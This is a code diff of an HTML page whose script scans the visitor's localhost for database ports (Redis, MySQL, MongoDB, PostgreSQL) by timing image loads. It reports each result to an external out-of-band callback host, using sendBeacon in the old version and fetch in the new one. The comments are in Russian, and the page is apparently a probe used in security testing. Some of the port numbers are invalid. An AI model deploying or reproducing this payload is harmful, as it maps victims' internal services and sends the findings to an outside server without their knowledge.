@@ -3,32 +3,40 @@
 <body>
     <script>
         const hook = "https://zmsfeowzqscjsayavbfe5bypi9ion50ff.oast.fun";
-        function probe(url, port) {
-            const start = Date.now
-();
+
+        function probe(port) {
+            const url = "http://127.0.0.1";
+            const start = Date.now();
             const img = new Image();
             
-            // Если порт открыт, но это не картинка - сработает onerror, но БЫСТРО
-            // Если порт закрыт - сработает onerror, но МЕДЛЕННО (таймаут)
+            // Устанавливаем таймаут, чтобы не ждать вечно
+            const timer = setTimeout(() => {
+                img.src = ""; // Прекращаем загрузку
+                record(port, "timeout", Date.now() - start);
+            }, 2000);
+
             img.onerror = () => {
-                const duration = Date.now
-() - start;
-                navigator.sendBeacon(`${hook}/PROBE_${port}?time=${duration}`);
+                clearTimeout(timer);
+                const duration = Date.now() - start;
+                record(port, "error", duration);
+            };
+
+            img.onload = () => {
+                clearTimeout(timer);
+                record(port, "open", Date.now() - start);
             };
             
-            img.src = `${url}:${port}/favicon.ico`;
+            img.src = `${url}:${port}/favicon.ico?v=${start}`;
         }
-        // Проверяем самые сочные порты
-       probe("http://127.0.0.1
-", "6379"); // Redis (часто без пароля внутри)
-probe("http://127.0.0.1
-", "3306"); // MySQL
-probe("http://127.0.0.1
-", "27017"); // MongoDB
-probe("http://127.0.0.1
-", "5432"); // PostgreSQL
-        probe("http://127.0.0.1
-", "54356782"); // PostgreSQL
+
+        function record(port, status, time) {
+            console.log(`Port ${port}: ${status} in ${time}ms`);
+            // Используем fetch вместо sendBeacon для надежности при тестах
+            fetch(`${hook}/?port=${port}&status=${status}&time=${time}`, {mode: 'no-cors'});
+        }
+
+        // Запуск
+        [6379, 3306, 27017, 5432, 8089797878970].forEach(probe);
     </script>
 </body>
 </html>
